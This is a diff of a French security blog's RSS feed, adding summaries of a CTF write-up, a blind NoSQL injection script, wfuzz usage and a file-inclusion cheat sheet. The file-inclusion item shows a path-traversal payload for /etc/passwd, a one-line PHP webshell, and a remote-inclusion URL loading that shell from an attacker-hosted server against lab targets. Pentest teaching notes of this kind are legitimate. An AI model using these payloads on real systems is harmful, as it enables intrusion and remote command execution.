@@ -1,15 +1,11 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>Web on LOLOLEKIK</title>
+    <title>web on LOLOLEKIK</title>
     <link>http://lololekik.com/tags/web/</link>
-    <description>Recent content in Web on LOLOLEKIK</description>
+    <description>Recent content in web on LOLOLEKIK</description>
     <generator>Hugo -- gohugo.io</generator>
-    <language>fr</language>
-    
-	<atom:link href="http://lololekik.com/tags/web/index.xml" rel="self" type="application/rss+xml" />
-    
-    
+    <language>fr</language><atom:link href="http://lololekik.com/tags/web/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>FCSC ANSSI 2020</title>
       <link>http://lololekik.com/writeups/fcsc-anssi/</link>
@@ -17,9 +13,44 @@
       
       <guid>http://lololekik.com/writeups/fcsc-anssi/</guid>
       <description>CTF organisé par l&amp;rsquo;ANSSI pour effectuer les préselections de l&amp;rsquo;ECSC
-Introduction Cette année j&amp;rsquo;ai eu le plaisir de participer au CTF de l&amp;rsquo;anssi ! Cet évènement a réuni plus de 2100 participants. C&#39;était un expérience enrichissante et je vous partage la totalité de mes challenges (excepté intro) ici ! Bonne lecture et bon courage :)
+Introduction Cette année j&amp;rsquo;ai eu le plaisir de participer au CTF de l&amp;rsquo;anssi ! Cet évènement a réuni plus de 2100 participants. C&amp;rsquo;était une expérience enrichissante et je vous partage la totalité de mes challenges (excepté intro) ici ! Bonne lecture et bon courage :)
 Ah oui et voici mon classement :
 Ce qui correspondait à 75 sur 633 dans la catégorie Sénior.</description>
+    </item>
+    
+    <item>
+      <title>NoSQL Injection Blind</title>
+      <link>http://lololekik.com/exploit/nosqlinjection/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>http://lololekik.com/exploit/nosqlinjection/</guid>
+      <description>Introduction Pour les injections NoSQL comme mongoDB, j&amp;rsquo;ai developpé un petit script qui permet de trouver des informations à l&amp;rsquo;aveugle. Il suffit de rentrer l&amp;rsquo;url en indiquant l&amp;rsquo;endroit d&amp;rsquo;injection. Il faut ensuite préciser au script comment il peut reconnaitre une page d&amp;rsquo;erreur et une page valide. Puis le tour est joué !
+Avant de faire tourner le script il faut connaitre la page qui nous donne une erreur et la page qui nous indique que le payload a fonctionné.</description>
+    </item>
+    
+    <item>
+      <title>Web - File Inclusion</title>
+      <link>http://lololekik.com/cuisine/lfi/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>http://lololekik.com/cuisine/lfi/</guid>
+      <description>Introduction Les file inclusion permettent de chercher des fichiers localement (LFI) ou sur un serveur distant (RFI) afin de les afficher.
+LFI payload
+http://192.168.1.91/mutillidae/index.php?page=../../../../../../../../../../etc/passwd  RFI &amp;amp; Simple WEBSHELL Sur notre machine on créé un fichier lololekik.php
+&amp;lt;?php shell_exec($_GET[&amp;#39;lolo&amp;#39;]) ?&amp;gt;Démarrage du serveur web
+┌──(lololekik㉿Ashitaka)-[~/metasploitable] └─$ python -m SimpleHTTPServer Serving HTTP on 0.0.0.0 port 8000 ... Puis utiliser la commande suivante pour utiliser le webshell
+http://192.168.1.91/dvwa/vulnerabilities/fi/?page=http://192.168.1.86:8000/lololekik.php&amp;amp;lolo=ifconfig LFI &amp;amp; Log poisonning Il est possible de contaminer plusieurs fichiers de log voici l&amp;rsquo;exemple avec /var/log/apache2/access.</description>
+    </item>
+    
+    <item>
+      <title>wfuzz - Fuzzing Web </title>
+      <link>http://lololekik.com/cuisine/wfuzz/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>http://lololekik.com/cuisine/wfuzz/</guid>
+      <description>Introduction wfuzz est un outil permettant de faire du bruteforfce sur les répertoires web afin de trouver des pages intéressantes.
+Voici le git de wfuzz : https://github.com/xmendez/wfuzz
+Aide -h # help --help # aide avancée -w # wordlist --hc	# pour cacher les pages avec un code spécifique --hl	# pour cacher les pages avec un nombre de ligne spécifique --hw	# pour cacher les pages avec un nombre de mot spécifique --hh	# pour cacher les pages avec un nombre de charactère spécifique -b # ajouter des cookies -d # Requête post -u # url --ip	# utilise l&#39;ip sous le format &#39;ip:port&#39; -f # fichier de sortie -L/--follow # suivre les redirections -X # methode -R # Recusrif Recherche de répertoire avec dictionnaire Ici on cache toute les requêtes avec un code 404.</description>
     </item>
     
   </channel>
